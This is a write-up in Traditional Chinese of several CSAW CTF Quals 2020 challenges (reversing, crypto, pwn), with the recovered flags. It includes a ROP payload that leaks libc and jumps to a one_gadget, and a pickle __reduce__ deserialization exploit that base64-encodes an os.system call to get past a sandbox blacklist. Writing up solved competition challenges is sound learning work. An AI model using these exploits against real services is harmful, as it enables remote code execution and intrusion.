# CSAW CTF Quals 2020

[TOC]

### rev 50: baby_mult
> Welcome to reversing! Prove your worth and get the flag from this neat little program!  
> file: program.txt  

```txt=
# program.txt
85, 72, 137, 229, 72, 131, 236, 24, 72, 199, 69, 248, 79, 0, 0, 0, 72, 184, 21, 79, 231, 75, 1, 0, 0, 0, 72, 137, 69, 240, 72, 199, 69, 232, 4, 0, 0, 0, 72, 199, 69, 224, 3, 0, 0, 0, 72, 199, 69, 216, 19, 0, 0, 0, 72, 199, 69, 208, 21, 1, 0, 0, 72, 184, 97, 91, 100, 75, 207, 119, 0, 0, 72, 137, 69, 200, 72, 199, 69, 192, 2, 0, 0, 0, 72, 199, 69, 184, 17, 0, 0, 0, 72, 199, 69, 176, 193, 33, 0, 0, 72, 199, 69, 168, 233, 101, 34, 24, 72, 199, 69, 160, 51, 8, 0, 0, 72, 199, 69, 152, 171, 10, 0, 0, 72, 199, 69, 144, 173, 170, 141, 0, 72, 139, 69, 248, 72, 15, 175, 69, 240, 72, 137, 69, 136, 72, 139, 69, 232, 72, 15, 175, 69, 224, 72, 15, 175, 69, 216, 72, 15, 175, 69, 208, 72, 15, 175, 69, 200, 72, 137, 69, 128, 72, 139, 69, 192, 72, 15, 175, 69, 184, 72, 15, 175, 69, 176, 72, 15, 175, 69, 168, 72, 137, 133, 120, 255, 255, 255, 72, 139, 69, 160, 72, 15, 175, 69, 152, 72, 15, 175, 69, 144, 72, 137, 133, 112, 255, 255, 255, 184, 0, 0, 0, 0, 201
```

長度看起來不長，可以猜是 shellcode  
聽說有些人是可以直接讀 machine code 的，這時就很有用XDD  

先用 [b2asm.py](./rev/baby_mult/b2asm.py) 解回 asm，其實有試著 load 進 C，但是莫名的失敗了...  
然後解回來的還是要改語法，拿掉 PTR，movabs 改 mov  
為了方便看 flag 還加了 syscall write...  
搞不好研究 C 為什麼失敗還比較快==  
改過的 shellcode 放在 [baby_mult.asm](./rev/baby_mult/baby_mult.asm)  

印出來的是反序的 flag: }m4rg0rp_d1l4v_r3pus{galf  
然後沒有正常結束，所以 segment fault 了XDD  

> flag{sup3r_v4l1d_pr0gr4m}

### rev 100: ezbreezy
> This binary has nothing to hide!
> file: app

ghidra 沒解出來...，Ida 加一分XDD  
其實用 objdump 很容易就發現問題了∑(￣□￣;)  


題目說 nothing to hide ，不過 objdump 可以發現有 section .aj1ishudgqis  
只是沒有跳過去的 control flow  
這部分的 code 其實就是一直判斷，然後都是 false  
瞄了一下判斷的值都不像 flag (哪來的自信...  
mov    BYTE PTR [rbp-0x4],0x8e 比較像  

```asm=
  8001be:       c6 45 fc 8e             mov    BYTE PTR [rbp-0x4],0x8e
  8001c2:       c7 45 fc a3 3c 09 00    mov    DWORD PTR [rbp-0x4],0x93ca3
  8001c9:       81 7d fc ec 40 1f 00    cmp    DWORD PTR [rbp-0x4],0x1f40ec
  8001d0:       75 0a                   jne    8001dc <getc@plt+0x7ff16c>
  8001d2:       b8 01 00 00 00          mov    eax,0x1
  8001d7:       e9 c6 02 00 00          jmp    8004a2 <getc@plt+0x7ff432>
  8001dc:       c6 45 fd 94             mov    BYTE PTR [rbp-0x3],0x94
  ...           ...                     ...
  800482:       c6 45 14 a5             mov    BYTE PTR [rbp+0x14],0xa5
  800486:       c7 45 fc 95 0b 05 00    mov    DWORD PTR [rbp-0x4],0x50b95
  80048d:       81 7d fc d2 79 24 00    cmp    DWORD PTR [rbp-0x4],0x2479d2
  800494:       75 07                   jne    80049d <getc@plt+0x7ff42d>
  800496:       b8 01 00 00 00          mov    eax,0x1
  80049b:       eb 05                   jmp    8004a2 <getc@plt+0x7ff432>
  8004a2:       5d                      pop    rbp
  8004a3:       c3                      ret
```

有點懶得 patch，其實也可以寫掉 .init_array 這些結構  
glibc 有蠻多可以改掉起始或結束的 control flow  
寫 gdb script 應該也蠻快的吧 ( •́ _ •̀)？  
不過 grep 出來也不難就是了  

```cmd=
objdump -dMintel app | grep '^  800' | grep 'mov    BYTE PTR \[rbp.0x' | awk -F, '{print $2}'
```

然後就用 [solution.py](./rev/ezbreezy/solution.py) 解出 flag   
嗯... 就... 轉 byte 減 40，突然覺得可能就減了，還真是 flag ...  

> flag{u_h4v3_r3c0v3r3d_m3}

### rev 150: not_malware
> To be perfectly frank, I do some malware-y things, but that doesn't mean that I'm actually malware, I promise!
> nc rev.chal.csaw.io 5008
> file: not_malware

好想寫說單純逆向得解啊_(¦3」∠)_  
這題貌似有一些反分析之類的，我 patch 掉 function call 成 nop : not_malware_patch  
逆回去的方式大概是:  
* strings -> flag.txt
* offset 0x1229 在讀 flag.txt，caller 是 offset 0x12bc
* 然後輸入啊，條件啊，主要的 control flow 都在這裡了

大致逆出來的條件是: 
1. len(input) < 60
1. input[:8] 'softbank'
1. input[8] = input[12] = input[33] = ':'
1. input[13:33] 會 map 到 rbp-0xa0 後 20 bytes
1. input[34:37] = 'end'
1. (input[9] - 48) 會是 srand() 的 seed
    * 會一直 loop 重設 srand()，每次 loop 結束前加(input[11] - 48) 更新 seed
    * 會取 rand()[(input[10] - 48)] 設定 rbp-0x80 後 20 bytes
1. rbp-0xa0 後 20 bytes 跟 rbp-0x80 後 20 bytes 會有某幾組要相等

看起來好麻煩ಠ_ಠ  
條件7很麻煩，乾脆就~~假設~~可以控制成全部的值都一樣好了  
條件7如下，這是其中一部分 :
```asm=
if ((char)var_a0h != (char)var_80h) {exit(1);}
if ((char)var_90h != (char)var_70h) {exit(1);}
if (var_95h != var_75h) {exit(1);}
if (var_a0h._3_1_ != var_80h._3_1_) {exit(1);}
if (var_a0h._7_1_ != var_80h._7_1_) {exit(1);}
if (var_91h != var_71h) {exit(1);}
if (var_a0h._1_1_ != var_80h._1_1_) {exit(1);}
if (var_94h != var_74h) {exit(1);}
...
```
我先控制 input[10] - 48 跟 input[11] - 48 結果都為 0  
那段的 code 逆出來大概是這個感覺吧~  
```python=
seed = ord(input[9]) - 48
update = ord(input[10]) - 48
index = ord(input[11]) - 48
for i in range(20):
    srand(seed)
    $rbp-0x80+i = rand()[index]
    seed += update
```
seed 不變，這樣設定 rbp-0x80 那 20 bytes 就都一樣  
戳了幾下發現好像蠻容易是 1 的，input[13:33] 就都填 1  
題目沒給 lib，其實也有點好奇 rand() 有沒有差  
最後可以總結一下 input = 'softbank:000:11111111111111111111:end'  
[solution.py](./rev/not_malware/solution.py) 只是送 payload  

> flag{th4x_f0r_ur_cr3d1t_c4rd}

### crypto 50: Perfect Secrecy
> Alice sent over a couple of images with sensitive information to Bob, encrypted with a pre-shared key. It is the most secure encryption scheme, theoretically...
> file: image1.png, image2.png

stegsolver 拿到 ZmxhZ3swbjNfdDFtM19QQGQhfQ==  
b64 decode  
完(ㆆᴗㆆ)  

> flag{0n3_t1m3_P@d!}

### crypto 100: modus_operandi
> Can't play CSAW without your favorite block cipher!
> nc crypto.chal.csaw.io 5001

nc 過去如下:

```txt=
Hello! For each plaintext you enter, find out if the block cipher used is ECB or CBC. Enter "ECB" or "CBC" to get the flag!
Enter plaintext: 
```

這題要猜 mode  
概念很簡單，如果2個 plain block 對應的 cipher block 一樣 -> ECB  
舉個栗子 :
```
假設一個 block 就 4 個 char 好了，比較簡單
plaintext = 01230123 ---加密---> ciphertext = 12341234
==> 這是 ECB
plaintext = 01230123 ---加密---> ciphertext = 12349487
==> 這不是 ECB
```
但是要注意最後會有 '\n' 佔走最後一個 char，把他 padding 到 3 個 block 就 OK 了  
然後，就在我猜完176次以後  
程式結束了???  
176/8 = 22，回答只有 ECB 跟 CBC 2 種  
原來是 bits 啊...  
[solution.py](./crypto/modus_operandi/solution.py)  

> flag{ECB_re@lly_sUck\$}

### pwn 50: roppity
> Welcome to pwn!
> nc pwn.chal.csaw.io 5016
> file: rop, libc-2.27.so

ROP 就...公式解啊~~  
先猜有 ASLR -> leak puts()的 GOT -> 要送2次 payload -> 要再回 main() 拿 gets()  
所以第一個 payload 長這樣  

```python=
payload = padding + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.functions['main'].address)
```

leak 出 puts() 的 mem_addr 後，減去 puts() 在 libc 的 offset 得到 base  
再用 base + one_gadget 做 ROP  
為了 one_gadget 的 constrain payload 尾巴多放 0x45 個 '\x00'  
所以第2個 payload 長這樣  

```python=
payload = padding + p64(base + one_gadget) + b'\x00' * 0x45
```

細節在 [solution.py](./pwn/roppity/solution.py)  

> flag{r0p_4ft3r_r0p_4ft3R_r0p}

### pwn 100: slithery
> Setting up a new coding environment for my data science students. Some of them are l33t h4ck3rs that got RCE and crashed my machine a few times :(. Can you help test this before I use it for my class? Two sandboxes should be better than one...
> nc pwn.chal.csaw.io 5011
> file: sandbox.py

這題其實 sanbox.py 會幫你 import numpy(可以 print RMbPOQHCzt 得知)  
numpy.load() 有反序列化的洞，是用 pickle.load 實作的  
再加上 sandbox.py 可以寫入 python code 執行...  

雖然有看到 blacklist，但是有 b64(HrjYMvtxwA)，所以...嘿嘿嘿  
這題利用 pickle.load 會先調用 \_\_reduce\_\_() 的特點  
埋 return os.system,('cat f*',) 進 class exploit，再用 pickle.dump()  
序列化之後以 b64 encode 就可以 bypass blacklist  
```python=
class exploit(object):
    def __reduce__(self):
        return os.system,('cat f*',)

kimji = pickle.dumps(exploit())
payload = 'RMbPOQHCzt.loads(HrjYMvtxwA(%s))' % base64.b64encode(kimji)
```
具體細節在 [solution.py](./pwn/slithery/solution.py)

> flag{y4_sl1th3r3d_0ut}
